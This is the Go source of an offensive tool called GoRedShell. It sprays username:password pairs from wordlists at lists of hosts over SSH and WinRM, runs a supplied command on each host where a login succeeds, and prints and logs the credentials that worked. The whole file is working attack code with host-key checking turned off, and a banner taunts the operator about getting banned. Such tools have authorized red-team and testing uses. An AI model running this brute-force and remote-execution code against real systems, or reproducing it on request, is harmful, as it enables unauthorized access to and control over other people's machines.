package main

import (
	"flag"
	"time"
	"fmt"
	"bufio"
	"path/filepath"
	"os"
	"strings"
	"strconv"
	"bytes"

	"github.com/fatih/color"
	"golang.org/x/crypto/ssh"
	"github.com/masterzen/winrm"
)

var serverLog *os.File

var (
	inittime = time.Now()

	// Starting w/ just ssh as a poc
	method = flag.String("method", "", "the auth mechanism to use for the brute force")
	exec = flag.String("exec", "", "a single command to execute when auth is successful")

	hosts = []string{}
	host = flag.String("host", "", "indicate the host or ip address to brute force")
	hostList = flag.String("hostList", "", "indicate wordlist file that has hosts or ips on each line")
	
	creds = []string{}
	cred = flag.String("cred", "", "a single un:pw credential pair to use")
	credList = flag.String("credList", "", "a username:password combo wordlist list, with unique un:pw combos on each line")

	// users = []string{}
	// user = flag.String("user", "root", "indicate user to brute force")
	// userList = flag.String("userList", "userList.txt", "indicate wordlist file that has users on each line")
	// passwords = []string{}
	// password = flag.String("password", "toor", "indicate password to use to brute force")
	// passwordList = flag.String("passwordList", "passwordList.txt", "indicate wordlist file that has passwords on each line")

	nobanner = flag.Bool("nobanner", false, "set this to true to silence the banner when run")
	verbose = flag.Bool("verbose", false, "verbosly send messages to the console")
	logName = flag.String("logName", "logFile.txt", "indicate a file to log verbosly to")
	log = flag.Bool("log", false, "indicate a file to log successful auths to")

	delay = flag.Duration("delay", 0, "add a delay to each scan")
	timeout = flag.Duration("timeout", 300*time.Millisecond, "set timeout for an ssh response")
)

type resp struct {
	Error error
//	mu    sync.Mutex
}

// Message is used to print a message to the command line
func message (level string, message string) {
	switch level {
	case "info":
		color.Cyan("[i]" + message)
		if *log == true { server("info: " + message) }
	case "note":
		color.Yellow("[-]" + message)
		if *log == true { server("note: " + message) }
	case "warn":
		color.Red("[!]" + message)
		if *log == true { server("warning: " + message) }
	case "debug":
		color.Red("[DEBUG]" + message)
		if *log == true { server("debug: " + message) }
	case "success":
		color.Green("[+]" + message)
		if *log == true { server("success: " + message) }
	default:
		color.Red("[_-_]Invalid message level: " + message)
		if *log == true { server("invalid: " + message) }
	}
}

func server(logMessage string){
	serverLog.WriteString(fmt.Sprintf("[%s] - %s\r\n", time.Now(), logMessage))
}

func sshcon(target, user, password, command string) *resp {
	response := &resp{}
	config := &ssh.ClientConfig{
		User:            user,
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Auth:            []ssh.AuthMethod{ssh.Password(password)},
		Timeout:         *timeout,
	}
	conn, err := ssh.Dial("tcp", target, config)
	if err != nil {
	if (*verbose == true) {
		message("note", "Auth failure for host "+target+" with un:pw - " + user +":"+password)
		//message("warn", "Errors creating ssh con: " + err.Error())
	}
	} else {
		message("success", "Created ssh connection to host "+target+" with un:pw - " + user +":"+password)
		session, _ := conn.NewSession()
		defer session.Close()
		var stdoutBuf bytes.Buffer
		session.Stdout = &stdoutBuf
		session.Run(command)
		if (*verbose == true) {
			message("note", "host "+target+" output: " + stdoutBuf.String())
		}
	}
	response.Error = err
	return response
}

func winrmcon(target, user, password, command string) {
	// Split our target on : by host:port
	tz := strings.Split(target, ":")
	tzh, tzp := tz[0], tz[1]
	tzpi, _ := strconv.Atoi(tzp)
	// tzh for host and tzp for port (tzpi is the int type of the port), default winrm is 5985 or 5986
	endpoint := winrm.NewEndpoint(tzh, tzpi, false, false, nil, nil, nil, 0)
	client, err := winrm.NewClient(endpoint, user, password)
	if ((err != nil) && (*verbose == true)) {
		message("warn", "Errors creating winrm connection: " + err.Error())
		return
	} else if (*verbose == true) {
		message("note", "started winrm connection to host "+target+" with un:pw - " + user +":"+password)
	}
	//var stdoutBuf bytes.Buffer
	_, err = client.Run(command, os.Stdout, os.Stderr)
		if ((err != nil) && (*verbose == true)) {
			message("warn", "Errors running command: " + command + " - " + err.Error())
			return
		} else {
			message("success", "winrm connection to host "+target+" with un:pw - " + user +":"+password)
			return
		}
		//message("success", "winrm connection to host "+target+" with un:pw - " + user +":"+password)
}

func main() {
	// Get current working path
	ex, err := os.Executable()
    if err != nil {
        panic(err)
    }
	exPath := filepath.Dir(ex)
	// Parse flags
	flag.Parse()
	// Set up logging
	if *nobanner == false {
		color.Red(Banner1)
		color.Red("Welcome to GoRedShell, don't get banned nub!")
	}
	logz := flag.Lookup("logName")
	//logging := flag.Lookup("logSuccess")
	if *log != true {
		message("warn", "Logging not enabled!")
	} else {
		// Server Logging
		if _, err := os.Stat(filepath.Join(exPath, logz.Value.String())); os.IsNotExist(err) {
			os.Create(filepath.Join(exPath, logz.Value.String()))
		}
		var errLog error
		serverLog, errLog = os.OpenFile(filepath.Join(exPath, logz.Value.String()), os.O_APPEND|os.O_WRONLY, 0600)
		if errLog != nil {
			color.Red("[!] " + errLog.Error())
		}
		defer serverLog.Close()
		message("info", "log file created at: "+filepath.Join(exPath, logz.Value.String()))
	}


	//verboseFlag := flag.Lookup("verbose")
	hostFlag := flag.Lookup("host")
	hostListFlag := flag.Lookup("hostList")
	credFlag := flag.Lookup("cred")
	credListFlag := flag.Lookup("credList")
	if (*verbose == true) {
		message("info", "host flag: "+hostFlag.Value.String())
		message("info", "hostList flag: "+hostListFlag.Value.String())
		message("info", "cred flag: "+credFlag.Value.String())	
		message("info", "credList flag: "+credListFlag.Value.String())	
		message("info", "exec flag: "+ *exec)
		message("info", "method flag: "+ *method)		
	}
	
	// Make sure an auth method has been selected
	if (*method == "" ){ message("warn", "No auth method selected! (ssh or winrm)"); return }

	// Collect our hosts first
	if ((*host != "") || (*hostList != "")){ 
		if (*host != "") {
			hosts = append(hosts, hostFlag.Value.String())
		} else if (*hostList != "") {
			hosts = append(hosts, readLines(hostListFlag.Value.String())...)
		} else {
			message("warn", "No hosts to scan")
		}
		if (hosts != nil) {
			// Collect our creds
			if ((*cred != "") || (*credList != "")){
				if (*cred != ""){
					creds = append(creds, credFlag.Value.String())
				} else if (*credList != ""){
					creds = append(creds, readLines(credListFlag.Value.String())...)
				} else {
					message("warn", "No creds to scan with")
				}
				if (creds != nil) {
					if (*exec == "") {
						message("warn", "Nothing to execute! Set a command with exec")
					} else {
						for credIndex, singleCred := range creds {
							cz := strings.Split(singleCred, ":")
							un, pw := cz[0], cz[1]
							if (*verbose == true) {
								message("info", "Trying credIndex: "+strconv.Itoa(credIndex+1)+", un:pw - " + un +":"+pw)
							}
							// Loop through all of our hosts
							for hostIndex, singleHost := range hosts {
								// Add multithreading here ?
								if (*verbose == true) {
									message("info", "Trying hostIndex: "+strconv.Itoa(hostIndex+1)+", host - " + singleHost)
								}
								// Only supported auth mechanism right now
								if (*method == "ssh"){
									resp := sshcon(singleHost, un, pw, *exec)
									if resp.Error != nil {
										if (*verbose == true) {
											message("warn", "Error: "+resp.Error.Error())
										}
									} else {
										//message("success", "Success!!")
									}
								} else if (*method == "winrm") {
									winrmcon(singleHost, un, pw, *exec)
								} else {
									message("warn", "Select a method: ssh or winrm")
								}
							}
							// Add delay here ?
							time.Sleep(*delay)
						}
						message("success", "Done!!")
					}
				} else {
					message("warn", "No creds to scan with")
				}
			} else {
				message("warn", "No creds to scan with")
			}
		} else {
			message("warn", "No hosts to scan")
		}

	} else {
		message("warn", "No hosts to scan")
	}

}

// readLines reads a whole file into memory
// and returns a slice of its lines.
func readLines(path string) ([]string) {
	file, err := os.Open(path)
	if err != nil {
		return nil
	}
	defer file.Close()
  
	var lines []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		lines = append(lines, scanner.Text())
	}
	return lines
}

const Banner1 string = `
                                            .,/(#%%&&%%#(/*..                                                                      
                                      ,(%@@@@@@&%##((((#%&@@@@@@%/.                                                                
                                 .(&@@@%/,..,*(#%&&&&&&&%#(*,.,(&@@@@@#,                                                           
                              *%@@(,.,(%@@@@@@@@@@@@@@@@@@@@@@@&* *%&@@@@&/                                                        
                           ,(@@&*./&@@@@@@@@@@@@@@@@@@@@@@@@&%//(%&%#/*#@@@.                                                     
                        .#@@@(.(@@@@@@@@@@@@@@@@@@@@@&%(/(#&@@@@@@@@@@@%,,&@@@&,                                                   
                      ,%@&(*/(((/((((((((/////***/((##, %@@@@@@@@@@@@@@@@&,,(@@@#.                                                 
                    .%@&(&@@@@@@@# .*&@@@@@@@@@@@@@@@@&.(@@@@@@@@@@@@@@@@@@(,.#@@&,                                                
                   #@@%#@@@@@@@@@,,&@@@@@@@@@@@@@@@@@@@/,@@@@@@@@@@@@@@@@@@@@, (@@&,                                               
                 *@@&(&@@@@@@@@@*/@@@@@@@@@@@@@@@@@@@@@%.%@@@@@@@@@@@@@@@@@@@@( ,&@@%.                                             
                (@@/(@@@@@@@@@@*(@@@@@@@@@@@@@@@@@@@@@@@,(@@@@@@@@@@@@@@@@@@@@@&..%@@&,                                            
               (@&*&@@@@@@@@@@,(@@@@@@@@@@@@@@@@@@@@@@@@/,@@@@@@@@@@@@@@@@@@@@@@@* #@@@*                                           
              *@@/&@@@@@@@@@@/*@@@@@@@@@@@@@@@@@@@@@@@@@/.%@@@@@@@@@@@@@@@@@@@@@@@*.(@@@,                                          
             /@@*&@@@@@@@@@&/.&@@@@@@@@@@@@@@@@@@@@@@@@@/ .%@@@@@@@@@@@@@@@@@@@@@@@#*#@@@(                                         
           ,#@@#&@@@@@@@@@@, #@@@@@@@@@@@@@@@@@@@@@@@@@@,(@%/.*%@@@@@@@@@@@@@@@@@@@@@%@@@@@#/                                      
          (@@@@@@@@@@@@@@@/ ,@@@@@@@@@@@@@@@@@@@@@@@@@@%,&@@@@&/  /@@@@*,           ./%@@@@@(                                    
        .%@@@@@@@@@@@@@@@&..(@@@@@@@@@@@@@@@@@@@@@@@@@@*/@@@@@@@@@@%#*.                  .(@@@@%.                                  
       (@@@#*.&@@@@@@@@@@# *%@@@@@@@@@@@@@@@@@@@@@@@@@( %@@@@@&(,                           .%@@@,                                 
     .%@@#.   &@@@@@@@@@# . *@@@@@@@@@@@@@@@@@@@@@@@@@#&@%/.                                  #@@&.                                
     %@@/     #@@@@@@@@(,&@/./@@@@@@@@@@@@@@@@@@@@@@&(,                                       .&@@(                                
   ./@@#      *@@@@@@@(,&@@&(.%@@@@@@@@@@@@@@@@@%/.                                            #@@#                                
   *%@@,       *&@@@@*,@@@@@@/,@@@@@@@@@@&%/*.                                                 (@@#                                
   /&@&.         .(&@@@@@@@@@@@@@(/,.                                       ,(&@@@@%.        %@@,                                
   *%@@,                                                                ,(&@@@@@@&../@&.      (@@/                                 
   .(@@/                                                           .,#&@@@@@@@@@@&.  %@/     *@@#                                  
     %@&.                                                    .*(&@@&%&@@@@@@@@@@@&.  ,@&.  /%@&,                                   
      %@&,                                             .*#&@@@@@/.   *@@@@@@@@@@@&.   %@%%@@@*                                     
       *@@#.                                    .*(%&@@@@@@&( %&.     #@@@@@@@@@@&.   %@@@#.                                       
        .(@@&*                            .**#&@@@@@@@@@@@@&( /@/     .&@@@@@@@@@*   .&@@*                                         
           .*%@@*,..        ..,*/##&&@@@@@@@@@@@@@@@@@@@@%*  %@,      *%@@@@%*     (@@/                                          
               .#@@%#%@@@@@@@@@@@@@@@/,   .%@@@@@@@@@@@@&,   .&@,                ./@@%                                           
                 /@&/ *@#         ,@@/        ./&@@@@@@@%*      ,&@#*             /@@@#                                            
                  #@@* #@,         /&&.            .*&@#         .%@@%*         *%@@@*                                             
                   *%@( (&,         .&&,              #@/          .,#&@@@&&&@@@@&*                                                
                     *&@#(@/.        .%@/              (@%,              ./@@@@(.                                                  
                       ,&@@@@%,        (@&*             .%@@&/.      ,(&@@@@%*                                                     
                         *&@@@@%*       *&@%(.            ,#%@@@&&&@@@@@@&/                                                        
                            .(&@@@@%#/,.   /#&@%/.           .,(@@@@@,                                                           
                                .*#&@@@@@@@@@@@@@@@@@@@@@@@@@@@&%/,                                                                
                                	.,*((##%%%%%%#(/*,.                      
        				    \(.@GRS@.)/,  
.	.	.	.	.	.	.	.	.	.	.	.	.								
.	.	.	.	.	.	.	.	.	.	.	.	.								`
